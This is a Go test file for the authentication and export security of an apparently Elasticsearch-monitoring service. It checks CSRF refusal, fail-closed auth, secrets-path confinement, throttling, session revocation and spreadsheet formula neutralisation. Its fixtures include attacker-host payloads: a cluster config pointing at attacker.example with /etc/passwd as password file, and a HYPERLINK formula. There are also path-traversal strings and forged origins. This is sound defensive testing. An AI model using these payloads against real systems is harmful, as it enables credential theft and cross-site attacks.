package api

import (
	"bytes"
	"context"
	"encoding/csv"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/xuri/excelize/v2"

	"estopo/internal/auth"
	"estopo/internal/auth/ldaptest"
	"estopo/internal/clock"
	"estopo/internal/i18n"
	"estopo/internal/query"
	"estopo/internal/store"
)

const testPassword = "a-long-enough-pw"

// newSecEnv is newAuthEnv with the clock and the options at hand.
func newSecEnv(t *testing.T, o Options) (*authEnv, *clock.Manual) {
	t.Helper()
	ctx := context.Background()
	clk := clock.NewManual(t0)
	st, err := store.Open(ctx, t.TempDir(), clk)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	o.Log, o.Clock, o.Store, o.Engine = log, clk, st, query.New(st, log, 2)
	o.Auth = auth.NewService(st, clk, log, o.Transport.TLS)
	return &authEnv{t: t, st: st, srv: New(o)}, clk
}

// localMode creates the accounts (name:role) and switches to local mode.
func (e *authEnv) localMode(accounts ...string) {
	e.t.Helper()
	for _, a := range accounts {
		name, role, _ := strings.Cut(a, ":")
		if rec := e.do(call{method: "PUT", path: "/api/v1/admin/users/" + name, body: `{"role":"` + role + `","password":"` + testPassword + `"}`}); rec.Code != 204 {
			e.t.Fatalf("create %s: %d %s", name, rec.Code, rec.Body.String())
		}
	}
	if rec := e.do(call{method: "PUT", path: "/api/v1/admin/auth", body: `{"mode":"local"}`}); rec.Code != 200 {
		e.t.Fatalf("switch to local: %d %s", rec.Code, rec.Body.String())
	}
}

// Authentication fails closed: when the settings or the sessions cannot be
// read (request given up, store error, corrupted setting), the request is
// refused, never served as in mode none.
func TestAuthFailsClosed(t *testing.T) {
	e := newAuthEnv(t, Transport{LoopbackOnly: true})
	e.localMode("alice:admin")
	cookie, csrf, _ := e.login("alice", testPassword)
	gone, cancel := context.WithCancel(context.Background())
	cancel()
	for _, c := range []call{
		{method: "GET", path: "/api/v1/admin/system", ctx: gone},
		{method: "GET", path: "/api/v1/admin/users", ctx: gone},
		{method: "GET", path: "/api/v1/clusters", ctx: gone},
		{method: "GET", path: "/api/v1/session", ctx: gone},
		{method: "PUT", path: "/api/v1/admin/retention", body: `{"max_age_days":60,"max_bytes":0}`, ctx: gone},
		{method: "DELETE", path: "/api/v1/admin/users/alice", ctx: gone},
		{method: "POST", path: "/api/v1/login", body: `{"name":"alice","password":"` + testPassword + `"}`, ctx: gone},
		{method: "GET", path: "/api/v1/admin/system", ctx: gone, cookie: cookie, csrf: csrf},
	} {
		if rec := e.do(c); rec.Code != http.StatusServiceUnavailable {
			t.Errorf("cancelled %s %s: %d %s", c.method, c.path, rec.Code, rec.Body.String())
		}
	}
	if rec := e.do(call{method: "GET", path: "/api/v1/admin/system"}); rec.Code != 401 {
		t.Fatalf("unauthenticated: %d", rec.Code)
	}

	// A corrupted setting is not "no setting".
	for _, raw := range []string{`{`, `{"mode":"off"}`, `{"session_hours":12}`, `null`} {
		if _, err := e.st.Meta.Exec(`UPDATE setting SET value = ? WHERE key = 'auth'`, raw); err != nil {
			t.Fatal(err)
		}
		for _, path := range []string{"/api/v1/admin/system", "/api/v1/session", "/api/v1/meta"} {
			if rec := e.do(call{method: "GET", path: path}); rec.Code != http.StatusServiceUnavailable {
				t.Errorf("setting %s, %s: %d %s", raw, path, rec.Code, rec.Body.String())
			}
		}
	}

	// Store error.
	e.st.Close()
	for _, path := range []string{"/api/v1/admin/system", "/api/v1/clusters", "/api/v1/session"} {
		if rec := e.do(call{method: "GET", path: path}); rec.Code != http.StatusServiceUnavailable {
			t.Errorf("store closed, %s: %d %s", path, rec.Code, rec.Body.String())
		}
	}
}

// State-changing requests that a page of another site can make a browser
// send are refused in every mode, mode none (the default) included.
func TestCrossSiteRequests(t *testing.T) {
	e := newAuthEnv(t, Transport{LoopbackOnly: true})
	ct := "application/json"
	retention := `{"max_age_days":60,"max_bytes":0}`
	steal := `{"URLs":["https://attacker.example"],"Auth":"basic","Username":"u","PasswordFile":"/etc/passwd"}`
	for name, c := range map[string]call{
		"form text/plain":      {method: "POST", path: "/api/v1/admin/clusters/x/test", body: steal, header: map[string]string{"Content-Type": "text/plain"}},
		"no content type":      {method: "POST", path: "/api/v1/admin/clusters/x/test", body: steal, header: map[string]string{}},
		"urlencoded":           {method: "PUT", path: "/api/v1/admin/retention", body: retention, header: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}},
		"other origin":         {method: "PUT", path: "/api/v1/admin/retention", body: retention, header: map[string]string{"Content-Type": ct, "Origin": "https://attacker.example"}},
		"null origin":          {method: "PUT", path: "/api/v1/admin/retention", body: retention, header: map[string]string{"Content-Type": ct, "Origin": "null"}},
		"cross-site":           {method: "PUT", path: "/api/v1/admin/retention", body: retention, header: map[string]string{"Content-Type": ct, "Sec-Fetch-Site": "cross-site"}},
		"same-site":            {method: "PUT", path: "/api/v1/admin/retention", body: retention, header: map[string]string{"Content-Type": ct, "Sec-Fetch-Site": "same-site"}},
		"body-less":            {method: "POST", path: "/api/v1/admin/clusters/x/capture", header: map[string]string{}},
		"body-less cross-site": {method: "DELETE", path: "/api/v1/admin/clusters/x", header: map[string]string{"X-Requested-With": RequestedWith, "Sec-Fetch-Site": "cross-site"}},
		"body-less logout":     {method: "POST", path: "/api/v1/logout", header: map[string]string{}},
	} {
		if rec := e.do(c); rec.Code != http.StatusForbidden || !strings.Contains(rec.Body.String(), "cross_site") {
			t.Errorf("%s: %d %s", name, rec.Code, rec.Body.String())
		}
	}
	if pol, _ := e.st.RetentionPolicy(context.Background()); pol.MaxAgeDays == 60 {
		t.Error("a refused request was applied")
	}

	// What the UI sends goes through (httptest requests are for example.com).
	for name, c := range map[string]call{
		"json":             {method: "PUT", path: "/api/v1/admin/retention", body: retention, header: map[string]string{"Content-Type": ct}},
		"json with origin": {method: "PUT", path: "/api/v1/admin/retention", body: retention, header: map[string]string{"Content-Type": "application/json; charset=utf-8", "Origin": "http://example.com", "Sec-Fetch-Site": "same-origin", "X-Requested-With": RequestedWith}},
		"body-less":        {method: "POST", path: "/api/v1/logout", header: map[string]string{"X-Requested-With": RequestedWith, "Origin": "http://EXAMPLE.com"}},
	} {
		if rec := e.do(c); rec.Code >= 300 {
			t.Errorf("%s: %d %s", name, rec.Code, rec.Body.String())
		}
	}
	// Reads are not concerned.
	if rec := e.do(call{method: "GET", path: "/api/v1/admin/users", header: map[string]string{"Sec-Fetch-Site": "cross-site"}}); rec.Code != 200 {
		t.Errorf("cross-site read: %d", rec.Code)
	}

	// With authentication: the login is under the same rules, and the
	// checks come on top of the CSRF token.
	e.localMode("alice:admin")
	login := `{"name":"alice","password":"` + testPassword + `"}`
	for name, h := range map[string]map[string]string{
		"text/plain":   {"Content-Type": "text/plain"},
		"other origin": {"Content-Type": ct, "Origin": "https://attacker.example"},
		"cross-site":   {"Content-Type": ct, "Sec-Fetch-Site": "cross-site"},
	} {
		if rec := e.do(call{method: "POST", path: "/api/v1/login", body: login, header: h}); rec.Code != http.StatusForbidden || len(rec.Result().Cookies()) != 0 {
			t.Errorf("login, %s: %d %s", name, rec.Code, rec.Body.String())
		}
	}
	cookie, csrf, code := e.login("alice", testPassword)
	if code != 200 {
		t.Fatalf("login: %d", code)
	}
	if rec := e.do(call{method: "PUT", path: "/api/v1/admin/retention", body: retention, cookie: cookie, csrf: csrf, header: map[string]string{"Content-Type": "text/plain"}}); rec.Code != http.StatusForbidden {
		t.Errorf("text/plain with a session: %d", rec.Code)
	}
	if rec := e.do(call{method: "PUT", path: "/api/v1/admin/retention", body: retention, cookie: cookie, csrf: csrf}); rec.Code != 200 {
		t.Errorf("UI request with a session: %d %s", rec.Code, rec.Body.String())
	}
}

// ESTOPO_SECRETS_DIR: the files named in the administration must be inside
// that directory, symbolic links resolved; without it nothing changes.
func TestSecretsDir(t *testing.T) {
	secrets, outside := t.TempDir(), t.TempDir()
	for _, f := range []string{filepath.Join(secrets, "pw"), filepath.Join(outside, "pw")} {
		if err := os.WriteFile(f, []byte("s3cret-content\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Symlink(filepath.Join(outside, "pw"), filepath.Join(secrets, "link")); err != nil {
		t.Skipf("symbolic links unavailable: %v", err)
	}
	quote := func(v any) string {
		b, _ := json.Marshal(v)
		return string(b)
	}
	es := func(field, path string) string {
		return `{"URLs":["http://127.0.0.1:1"],"Auth":"basic","Username":"u","Timeout":1000000000,"ConnectTimeout":1000000000,` + quote(field) + `:` + quote(path) + `}`
	}
	ldap := func(c auth.LDAPConfig) string {
		c.URLs, c.BindDN, c.UserBase, c.GroupBase, c.AdminGroups = []string{"ldaps://127.0.0.1:1"}, ldaptest.ServiceDN, ldaptest.PeopleBase, ldaptest.GroupBase, []string{ldaptest.AdminGroupDN}
		c.TimeoutSeconds = 1
		return quote(c)
	}

	e, _ := newSecEnv(t, Options{Transport: Transport{LoopbackOnly: true}, SecretsDir: secrets})
	refused := map[string]call{}
	for _, field := range []string{"PasswordFile", "APIKeyFile", "CertFile", "KeyFile", "KeyPassphraseFile", "CAPath"} {
		refused["save "+field] = call{method: "PUT", path: "/api/v1/admin/clusters/c1", body: `{"es":` + es(field, filepath.Join(outside, "pw")) + `}`}
		refused["test "+field] = call{method: "POST", path: "/api/v1/admin/clusters/c1/test", body: es(field, filepath.Join(outside, "pw"))}
	}
	refused["symbolic link"] = call{method: "POST", path: "/api/v1/admin/clusters/c1/test", body: es("PasswordFile", filepath.Join(secrets, "link"))}
	refused["dot dot"] = call{method: "POST", path: "/api/v1/admin/clusters/c1/test", body: es("PasswordFile", filepath.Join(secrets, "..", filepath.Base(outside), "pw"))}
	refused["missing file"] = call{method: "PUT", path: "/api/v1/admin/clusters/c1", body: `{"es":` + es("PasswordFile", filepath.Join(secrets, "absent")) + `}`}
	refused["default CA"] = call{method: "PUT", path: "/api/v1/admin/tls", body: `{"ca_path":` + quote(outside) + `}`}
	refused["LDAP test, password"] = call{method: "POST", path: "/api/v1/admin/auth/ldap-test", body: `{"ldap":` + ldap(auth.LDAPConfig{BindPasswordFile: filepath.Join(outside, "pw")}) + `}`}
	refused["LDAP test, CA"] = call{method: "POST", path: "/api/v1/admin/auth/ldap-test", body: `{"ldap":` + ldap(auth.LDAPConfig{BindPasswordFile: filepath.Join(secrets, "pw"), CAFile: filepath.Join(outside, "pw")}) + `}`}
	refused["LDAP mode"] = call{method: "PUT", path: "/api/v1/admin/auth", body: `{"mode":"ldap","ldap":` + ldap(auth.LDAPConfig{BindPasswordFile: filepath.Join(outside, "pw")}) + `}`}
	for name, c := range refused {
		rec := e.do(c)
		if rec.Code != 400 || !strings.Contains(rec.Body.String(), "ESTOPO_SECRETS_DIR") {
			t.Errorf("%s: %d %s", name, rec.Code, rec.Body.String())
		}
		if strings.Contains(rec.Body.String(), "s3cret") {
			t.Errorf("%s: file content in the answer: %s", name, rec.Body.String())
		}
	}
	inside := es("PasswordFile", filepath.Join(secrets, "pw"))
	if rec := e.do(call{method: "PUT", path: "/api/v1/admin/clusters/c1", body: `{"es":` + inside + `}`}); rec.Code != 200 {
		t.Errorf("file of the secrets directory, save: %d %s", rec.Code, rec.Body.String())
	}
	// The connection fails (nothing listens), but the file was accepted and
	// its content is not in the answer.
	if rec := e.do(call{method: "POST", path: "/api/v1/admin/clusters/c1/test", body: inside}); rec.Code != 200 || strings.Contains(rec.Body.String(), "s3cret") {
		t.Errorf("file of the secrets directory, test: %d %s", rec.Code, rec.Body.String())
	}
	if rec := e.do(call{method: "POST", path: "/api/v1/admin/auth/ldap-test", body: `{"ldap":` + ldap(auth.LDAPConfig{BindPasswordFile: filepath.Join(secrets, "pw")}) + `}`}); rec.Code != 200 {
		t.Errorf("LDAP file of the secrets directory: %d %s", rec.Code, rec.Body.String())
	}

	// Variable not set: as before.
	free, _ := newSecEnv(t, Options{Transport: Transport{LoopbackOnly: true}})
	for name, c := range map[string]call{
		"save": {method: "PUT", path: "/api/v1/admin/clusters/c1", body: `{"es":` + es("PasswordFile", filepath.Join(outside, "pw")) + `}`},
		"test": {method: "POST", path: "/api/v1/admin/clusters/c1/test", body: es("PasswordFile", filepath.Join(outside, "pw"))},
		"CA":   {method: "PUT", path: "/api/v1/admin/tls", body: `{"ca_path":""}`},
	} {
		if rec := free.do(c); rec.Code != 200 || strings.Contains(rec.Body.String(), "s3cret") {
			t.Errorf("without ESTOPO_SECRETS_DIR, %s: %d %s", name, rec.Code, rec.Body.String())
		}
	}
}

// The lock of an account is per client address: failures from one address
// do not lock the user out from another one. The current password of a
// password change is under the same throttling.
func TestThrottlingPerClient(t *testing.T) {
	e := newAuthEnv(t, Transport{LoopbackOnly: true})
	e.localMode("alice:admin")
	body := func(pw string) string { return `{"name":"alice","password":"` + pw + `"}` }
	for i := 0; i < 5; i++ {
		if rec := e.do(call{method: "POST", path: "/api/v1/login", body: body("wrong-password!"), addr: "10.6.6.6"}); rec.Code != 401 {
			t.Fatalf("attempt %d: %d", i+1, rec.Code)
		}
	}
	if rec := e.do(call{method: "POST", path: "/api/v1/login", body: body(testPassword), addr: "10.6.6.6"}); rec.Code != http.StatusTooManyRequests {
		t.Errorf("6th attempt of the attacker: %d", rec.Code)
	}
	cookie, csrf, code := e.login("alice", testPassword)
	if code != 200 {
		t.Fatalf("alice locked out by another address: %d", code)
	}

	change := call{method: "PUT", path: "/api/v1/me/password", body: `{"old":"wrong-password!","new":"another-long-pw"}`, cookie: cookie, csrf: csrf}
	for i := 0; i < 5; i++ {
		if rec := e.do(change); rec.Code != http.StatusForbidden {
			t.Fatalf("wrong current password, attempt %d: %d", i+1, rec.Code)
		}
	}
	change.body = `{"old":"` + testPassword + `","new":"another-long-pw"}`
	if rec := e.do(change); rec.Code != http.StatusTooManyRequests {
		t.Errorf("6th password change: %d %s", rec.Code, rec.Body.String())
	}
}

// Sessions end 7 days after the login whatever the activity, and when the
// password or the role of the account changes or the account is disabled.
func TestSessionLifetimeAndRevocation(t *testing.T) {
	e, clk := newSecEnv(t, Options{Transport: Transport{LoopbackOnly: true}})
	e.localMode("alice:admin", "bob:reader", "root:admin")
	alive := func(c *http.Cookie) bool {
		return e.do(call{method: "GET", path: "/api/v1/clusters", cookie: c}).Code == 200
	}

	// An active session slides, but not beyond the absolute lifetime.
	cookie, _, _ := e.login("alice", testPassword)
	for used := time.Duration(0); used < auth.MaxSessionLifetime-6*time.Hour; used += 5 * time.Hour {
		if !alive(cookie) {
			t.Fatalf("active session ended after %v", used)
		}
		clk.Advance(5 * time.Hour)
	}
	clk.Advance(6 * time.Hour)
	if alive(cookie) {
		t.Error("session alive more than 7 days after the login")
	}

	// Own password change: the session in use stays, the others end.
	a1, csrf1, _ := e.login("alice", testPassword)
	a2, _, _ := e.login("alice", testPassword)
	if rec := e.do(call{method: "PUT", path: "/api/v1/me/password", body: `{"old":"` + testPassword + `","new":"another-long-pw"}`, cookie: a1, csrf: csrf1}); rec.Code != 204 {
		t.Fatalf("password change: %d %s", rec.Code, rec.Body.String())
	}
	if !alive(a1) || alive(a2) {
		t.Errorf("after the password change: session in use %v, other session %v", alive(a1), alive(a2))
	}

	// Changes made by an administrator.
	admin, acsrf, _ := e.login("root", testPassword)
	save := func(name, body string) {
		t.Helper()
		if rec := e.do(call{method: "PUT", path: "/api/v1/admin/users/" + name, body: body, cookie: admin, csrf: acsrf}); rec.Code != 204 {
			t.Fatalf("save %s: %d %s", name, rec.Code, rec.Body.String())
		}
	}
	bob, _, _ := e.login("bob", testPassword)
	save("bob", `{"role":"reader"}`)
	if !alive(bob) {
		t.Error("an unchanged account lost its session")
	}
	save("bob", `{"role":"reader","password":"yet-another-long-pw"}`)
	if alive(bob) {
		t.Error("session alive after a password reset")
	}
	bob, _, _ = e.login("bob", "yet-another-long-pw")
	save("bob", `{"role":"admin"}`)
	if alive(bob) {
		t.Error("session alive after a role change")
	}
	bob, _, _ = e.login("bob", "yet-another-long-pw")
	save("bob", `{"role":"admin","disabled":true}`)
	save("bob", `{"role":"admin"}`)
	if alive(bob) {
		t.Error("session of a disabled account alive again once enabled")
	}
	// estopo admin reset-password.
	bob, _, _ = e.login("bob", "yet-another-long-pw")
	if _, err := auth.ResetPassword(context.Background(), e.st, "bob"); err != nil {
		t.Fatal(err)
	}
	if alive(bob) {
		t.Error("session alive after reset-password")
	}
	if !alive(admin) {
		t.Error("the administrator lost its session")
	}
}

// The last local administrator cannot be disabled, demoted or deleted
// while authentication is enabled.
func TestLastAdmin(t *testing.T) {
	e := newAuthEnv(t, Transport{LoopbackOnly: true})
	e.localMode("alice:admin", "bob:reader")
	cookie, csrf, _ := e.login("alice", testPassword)
	do := func(method, path, body string) int {
		return e.do(call{method: method, path: path, body: body, cookie: cookie, csrf: csrf}).Code
	}
	if code := do("PUT", "/api/v1/admin/users/alice", `{"role":"reader"}`); code != http.StatusConflict {
		t.Errorf("last admin demoted: %d", code)
	}
	if code := do("PUT", "/api/v1/admin/users/alice", `{"role":"admin","disabled":true}`); code != http.StatusConflict {
		t.Errorf("last admin disabled: %d", code)
	}
	if code := do("PUT", "/api/v1/admin/users/alice", `{"role":"admin"}`); code != 204 {
		t.Errorf("unchanged last admin: %d", code)
	}
	if u, _ := e.st.User(context.Background(), "alice"); u.Role != auth.RoleAdmin || u.Disabled {
		t.Fatalf("alice %+v", u)
	}
	// With a second administrator, each can go, but not both.
	if code := do("PUT", "/api/v1/admin/users/bob", `{"role":"admin"}`); code != 204 {
		t.Fatalf("promote bob: %d", code)
	}
	bob, bcsrf, _ := e.login("bob", testPassword)
	if rec := e.do(call{method: "DELETE", path: "/api/v1/admin/users/alice", cookie: bob, csrf: bcsrf}); rec.Code != 204 {
		t.Errorf("delete one of two admins: %d %s", rec.Code, rec.Body.String())
	}
	e.do(call{method: "PUT", path: "/api/v1/admin/users/carol", body: `{"role":"admin","password":"` + testPassword + `"}`, cookie: bob, csrf: bcsrf})
	e.do(call{method: "PUT", path: "/api/v1/admin/users/bob", body: `{"role":"reader"}`, cookie: bob, csrf: bcsrf})
	carol, ccsrf, _ := e.login("carol", testPassword)
	// bob is a reader now: carol is the last one, deleting bob is fine.
	if rec := e.do(call{method: "DELETE", path: "/api/v1/admin/users/bob", cookie: carol, csrf: ccsrf}); rec.Code != 204 {
		t.Errorf("delete a reader: %d %s", rec.Code, rec.Body.String())
	}

	// Mode none: no such protection is needed.
	free := newAuthEnv(t, Transport{LoopbackOnly: true})
	free.do(call{method: "PUT", path: "/api/v1/admin/users/alice", body: `{"role":"admin","password":"` + testPassword + `"}`})
	if rec := free.do(call{method: "DELETE", path: "/api/v1/admin/users/alice"}); rec.Code != 204 {
		t.Errorf("mode none: %d", rec.Code)
	}
}

// In LDAP mode the last local administrator is the way back in when the
// directory fails: an administrator of the directory cannot delete it.
func TestLastAdminInLDAPMode(t *testing.T) {
	e := newAuthEnv(t, Transport{LoopbackOnly: true})
	e.localMode("alice:admin")
	ctx := context.Background()
	e.st.SaveUser(ctx, store.User{Name: "root", Role: auth.RoleAdmin, Source: "ldap"})
	e.st.SetSetting(ctx, "auth", auth.Config{Mode: auth.ModeLDAP})
	req := httptest.NewRequest("DELETE", "/api/v1/admin/users/alice", nil)
	req.Header.Set("X-Requested-With", RequestedWith)
	req.Header.Set("X-CSRF-Token", "token")
	req.AddCookie(&http.Cookie{Name: auth.CookieName, Value: "session-of-root"})
	if err := e.st.CreateSession(ctx, store.Session{TokenHash: auth.SessionHash(req), User: "root", CSRF: "token",
		CreatedMs: t0.UnixMilli(), ExpiresMs: t0.Add(time.Hour).UnixMilli()}); err != nil {
		t.Fatal(err)
	}
	rec := httptest.NewRecorder()
	e.srv.ServeHTTP(rec, req)
	if rec.Code != http.StatusConflict || !strings.Contains(rec.Body.String(), "last_admin") {
		t.Errorf("last local admin deleted in LDAP mode: %d %s", rec.Code, rec.Body.String())
	}
}

func TestSessionHoursBounds(t *testing.T) {
	e := newAuthEnv(t, Transport{LoopbackOnly: true})
	for _, h := range []string{"-1", "721", "100000000"} {
		if rec := e.do(call{method: "PUT", path: "/api/v1/admin/auth", body: `{"mode":"none","session_hours":` + h + `}`}); rec.Code != 400 {
			t.Errorf("session_hours %s: %d", h, rec.Code)
		}
	}
	for _, h := range []string{"0", "1", "720"} {
		if rec := e.do(call{method: "PUT", path: "/api/v1/admin/auth", body: `{"mode":"none","session_hours":` + h + `}`}); rec.Code != 200 {
			t.Errorf("session_hours %s: %d %s", h, rec.Code, rec.Body.String())
		}
	}
	// A value stored by an older version is capped.
	e.st.SetSetting(context.Background(), "auth", auth.Config{Mode: auth.ModeNone, SessionHours: 1 << 40})
	var c auth.Config
	json.Unmarshal(e.do(call{method: "GET", path: "/api/v1/admin/auth"}).Body.Bytes(), &c)
	if c.SessionHours != auth.MaxSessionHours {
		t.Errorf("stored session_hours not capped: %d", c.SessionHours)
	}
}

// The login name of a failed attempt is cut in the audit trail: it may be
// huge, or a password typed in the wrong field.
func TestAuditedLoginNameIsCut(t *testing.T) {
	e := newAuthEnv(t, Transport{LoopbackOnly: true})
	e.localMode("alice:admin")
	if _, _, code := e.login(strings.Repeat("x", 5000), "wrong-password!"); code != 401 {
		t.Fatalf("login: %d", code)
	}
	log, _ := e.st.AuditLog(context.Background(), 10)
	found := false
	for _, a := range log {
		if a.Action == "login.failure" {
			found = true
			if len(a.Actor) != 128 {
				t.Errorf("actor of %d characters", len(a.Actor))
			}
		}
	}
	if !found {
		t.Error("failure not audited")
	}
}

// The session cookie is Secure whenever the browser is on HTTPS: the
// listener serves TLS, or the browser says so (reverse proxy).
func TestSecureCookie(t *testing.T) {
	login := func(e *authEnv, origin string) *http.Cookie {
		t.Helper()
		e.localMode("alice:admin")
		h := map[string]string{"Content-Type": "application/json"}
		if origin != "" {
			h["Origin"] = origin
		}
		rec := e.do(call{method: "POST", path: "/api/v1/login", body: `{"name":"alice","password":"` + testPassword + `"}`, header: h})
		if rec.Code != 200 || len(rec.Result().Cookies()) != 1 {
			t.Fatalf("login: %d %s", rec.Code, rec.Body.String())
		}
		return rec.Result().Cookies()[0]
	}
	tls, _ := newSecEnv(t, Options{Transport: Transport{TLS: true}})
	if !login(tls, "").Secure {
		t.Error("TLS listener: cookie without Secure")
	}
	if !login(newAuthEnv(t, Transport{LoopbackOnly: true}), "https://example.com").Secure {
		t.Error("HTTPS origin behind a proxy: cookie without Secure")
	}
	if login(newAuthEnv(t, Transport{LoopbackOnly: true}), "http://example.com").Secure {
		t.Error("plain HTTP on loopback: the browser would drop a Secure cookie")
	}
}

func TestHSTS(t *testing.T) {
	tls, _ := newSecEnv(t, Options{Transport: Transport{TLS: true}})
	if got := tls.do(call{method: "GET", path: "/healthz"}).Header().Get("Strict-Transport-Security"); got != "max-age=31536000" {
		t.Errorf("TLS: Strict-Transport-Security %q", got)
	}
	plain := newAuthEnv(t, Transport{LoopbackOnly: true})
	if got := plain.do(call{method: "GET", path: "/healthz"}).Header().Get("Strict-Transport-Security"); got != "" {
		t.Errorf("plain HTTP: Strict-Transport-Security %q", got)
	}
}

// Whitelist entries end up in the path of a request to Elasticsearch.
func TestSettingsWhitelistNames(t *testing.T) {
	e := newAuthEnv(t, Transport{LoopbackOnly: true})
	for _, bad := range []string{`[""]`, `["index.a/../../_cluster/settings"]`, `["index.a?pretty"]`, `["index a"]`, `["index.a,_all"]`, `["index.%2e"]`} {
		if rec := e.do(call{method: "PUT", path: "/api/v1/admin/settings-whitelist", body: bad}); rec.Code != 400 {
			t.Errorf("%s: %d", bad, rec.Code)
		}
	}
	if rec := e.do(call{method: "PUT", path: "/api/v1/admin/settings-whitelist", body: `["index.routing.allocation.*","index.number_of_replicas","index.lifecycle.name-2"]`}); rec.Code != 200 {
		t.Errorf("valid names: %d %s", rec.Code, rec.Body.String())
	}
}

// Extreme dates are refused before they reach the query engine (they made
// the bucket computation overflow).
func TestTimeWindowBounds(t *testing.T) {
	e := newAEnv(t)
	for _, q := range []string{
		"from=-5000000000000000000&to=5000000000000000000",
		"from=0&to=5000000000000000000",
		"from=-1",
		"to=7258118400001", // after 2200
		"from=2300-01-01T00:00:00Z",
		"from=" + ms(time.Hour) + "&to=" + ms(0),
		"from=0&to=" + ms(0), // longer than 10 years
	} {
		for _, path := range []string{"/api/v1/clusters/small/group/history?", "/api/v1/clusters/small/timeline?", "/api/v1/clusters/small/events?"} {
			if rec := e.get(path+q, nil); rec.Code != 400 {
				t.Errorf("%s %s: %d %s", path, q, rec.Code, rec.Body.String())
			}
		}
	}
	if rec := e.get("/api/v1/clusters/small/state?at=-5000000000000000000", nil); rec.Code != 400 {
		t.Errorf("state at a negative date: %d", rec.Code)
	}
	// The longest accepted window is served.
	var st StateView
	e.get("/api/v1/clusters/small/state?at="+ms(time.Hour), &st)
	group := groupQuery([]string{st.Hierarchy.Children[0].Label})
	long := "from=" + jsonNum(t0.Add(-3650*24*time.Hour).UnixMilli()) + "&to=" + ms(time.Hour)
	for _, path := range []string{"/api/v1/clusters/small/group/history?" + group + "&", "/api/v1/clusters/small/timeline?", "/api/v1/clusters/small/events?"} {
		if rec := e.get(path+long, nil); rec.Code != 200 {
			t.Errorf("%s over 10 years: %d %s", path, rec.Code, rec.Body.String())
		}
	}
}

// Texts of a CSV export that a spreadsheet would run as formulas are
// quoted; numbers are not, and XLSX cells are typed as text.
func TestExportFormulaInjection(t *testing.T) {
	tables := []table{{sheet: "sheet.nodes", cols: []string{"col.index", "col.shard"}, rows: [][]any{
		{`=HYPERLINK("http://attacker.example","x")`, -3},
		{"+1+1", 2.5},
		{"-cmd", int64(-7)},
		{"@SUM(A1)", 0},
		{"\tx", 0},
		{"\rx", 0},
		{"logs-2026.10.04", 1},
	}}}
	rec := httptest.NewRecorder()
	writeCSV(rec, tables, i18n.Normalize("en"))
	rows, err := csv.NewReader(rec.Body).ReadAll()
	if err != nil || len(rows) != 8 {
		t.Fatalf("csv: %v %v", rows, err)
	}
	for i, row := range rows[1:7] {
		if !strings.HasPrefix(row[0], "'") {
			t.Errorf("row %d: %q is not neutralised", i, row[0])
		}
	}
	if rows[7][0] != "logs-2026.10.04" || rows[1][1] != "-3" || rows[3][1] != "-7" {
		t.Errorf("plain cells changed: %v", rows)
	}

	f, err := xlsx(tables, i18n.Normalize("en"))
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	if err := f.Write(&buf); err != nil {
		t.Fatal(err)
	}
	x, err := excelize.OpenReader(&buf)
	if err != nil {
		t.Fatal(err)
	}
	defer x.Close()
	sheet := x.GetSheetName(0)
	if formula, _ := x.GetCellFormula(sheet, "A2"); formula != "" {
		t.Errorf("XLSX cell holds a formula: %q", formula)
	}
	if typ, _ := x.GetCellType(sheet, "A2"); typ != excelize.CellTypeInlineString && typ != excelize.CellTypeSharedString {
		t.Errorf("XLSX cell type %v, want a text", typ)
	}
	if v, _ := x.GetCellValue(sheet, "A2"); !strings.HasPrefix(v, "=HYPERLINK") {
		t.Errorf("XLSX text cell: %q", v)
	}
}
